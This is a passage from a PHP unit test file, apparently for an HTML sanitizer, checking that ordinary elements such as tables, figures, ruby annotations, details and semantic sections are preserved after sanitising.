        $this->assertStringContainsString('<bdi>', $result);
    }

    public function test_sanitizes_bdo_element(): void {
        $html = '<p><bdo dir="rtl">right to left</bdo></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<bdo', $result);
    }

    public function test_sanitizes_acronym_element(): void {
        $html = '<p><acronym title="HTML">HTML</acronym></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<acronym', $result);
    }

    public function test_sanitizes_main_element(): void {
        $html = '<main><p>Main content</p></main>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<main>', $result);
        $this->assertStringContainsString('Main content', $result);
    }

    public function test_sanitizes_noscript_element(): void {
        $html = '<noscript>JavaScript required</noscript>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<noscript>', $result);
    }

    public function test_sanitizes_header_element(): void {
        $html = '<header><h1>Header</h1></header>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<header>', $result);
    }

    public function test_sanitizes_footer_element(): void {
        $html = '<footer><p>Footer text</p></footer>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<footer>', $result);
    }

    public function test_sanitizes_section_element(): void {
        $html = '<section><h2>Section</h2><p>Content</p></section>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<section>', $result);
    }

    public function test_sanitizes_article_element(): void {
        $html = '<article><h2>Article</h2><p>Content</p></article>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<article>', $result);
    }

    public function test_sanitizes_nav_element(): void {
        $html = '<nav><ul><li>Link</li></ul></nav>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<nav>', $result);
    }

    public function test_sanitizes_aside_element(): void {
        $html = '<aside><p>Sidebar content</p></aside>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<aside>', $result);
    }

    public function test_sanitizes_figcaption_element(): void {
        $html = '<figure><img src="img.png"><figcaption>Caption</figcaption></figure>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<figcaption>', $result);
        $this->assertStringContainsString('Caption', $result);
    }

    public function test_sanitizes_picture_element(): void {
        $html = '<picture><source srcset="x.jpg"><img src="x.png"></picture>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<picture>', $result);
    }

    public function test_sanitizes_source_element(): void {
        $html = '<video><source src="v.mp4" type="video/mp4"></video>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<source', $result);
    }

    public function test_sanitizes_track_element(): void {
        $html = '<video><track src="subtitles.vtt" kind="subtitles"></video>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<track', $result);
    }

    public function test_sanitizes_col_element(): void {
        $html = '<table><colgroup><col></colgroup></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<col>', $result);
    }

    public function test_sanitizes_colgroup_element(): void {
        $html = '<table><colgroup><col></colgroup></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<colgroup>', $result);
    }

    public function test_sanitizes_tfoot_element(): void {
        $html = '<table><tfoot><tr><td>Footer</td></tr></tfoot></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<tfoot>', $result);
    }

    public function test_sanitizes_caption_element(): void {
        $html = '<table><caption>Table</caption></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<caption>', $result);
    }

    public function test_sanitizes_strike_element(): void {
        $html = '<p><strike>strikethrough</strike></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<strike>', $result);
    }

    public function test_sanitizes_tt_element(): void {
        $html = '<p><tt>teletype</tt></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<tt>', $result);
    }

    public function test_sanitizes_s_element(): void {
        $html = '<p><s>strikethrough</s></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<s>', $result);
    }

    public function test_sanitizes_mark_element(): void {
        $html = '<p><mark>highlighted</mark></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<mark>', $result);
    }

    public function test_sanitizes_samp_element(): void {
        $html = '<p><samp>program output</samp></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<samp>', $result);
    }

    public function test_sanitizes_dfn_element(): void {
        $html = '<p><dfn>definition</dfn></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<dfn>', $result);
    }

    public function test_sanitizes_wbr_element(): void {
        $html = '<p>verylong<wbr>word</p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('wbr', $result);
    }

    public function test_sanitizes_font_element(): void {
        $html = '<p><font color="red">red text</font></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<font>', $result);
    }

    public function test_sanitizes_center_element(): void {
        $html = '<center>centered</center>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<center>', $result);
    }

    public function test_sanitizes_description_element(): void {
        $html = '<dl><dt>Term</dt><description>Description</description></dl>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<description>', $result);
    }

    public function test_sanitizes_ruby_rp_rt(): void {
        $html = '<ruby>漢<rp>(</rp><rt>kan</rt><rp>)</rp></ruby>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<rp>', $result);
        $this->assertStringContainsString('<rt>', $result);
    }

    public function test_sanitizes_tr_element(): void {
        $html = '<table><tr><td>Cell</td></tr></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<tr>', $result);
    }

    public function test_sanitizes_thead_element(): void {
        $html = '<table><thead><tr><th>Header</th></tr></thead></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<thead>', $result);
    }

    public function test_sanitizes_tbody_element(): void {
        $html = '<table><tbody><tr><td>Body</td></tr></tbody></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<tbody>', $result);
    }

    public function test_sanitizes_th_element(): void {
        $html = '<table><tr><th>Header</th></tr></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<th>', $result);
    }

    public function test_sanitizes_td_element(): void {
        $html = '<table><tr><td>Cell</td></tr></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<td>', $result);
    }

    public function test_sanitizes_summary_element(): void {
        $html = '<details><summary>Toggle</summary>Content</details>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<summary>', $result);
    }

    public function test_sanitizes_figure_element(): void {
        $html = '<figure><img src="img.png"><figcaption>Caption</figcaption></figure>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<figure>', $result);
    }

    public function test_sanitizes_details_element(): void {
        $html = '<details><summary>Toggle</summary>Content</details>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<details>', $result);
    }

    public function test_sanitizes_video_element(): void {
        $html = '<video src="video.mp4"></video>';
        $result = Sanitizer::sanitize($html);

        $this->assertStringContainsString("<video", $result);
    }

    public function test_sanitizes_blockquote_element(): void {
        $html = '<blockquote cite="http://example.com">Quote</blockquote>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<blockquote', $result);
    }

}
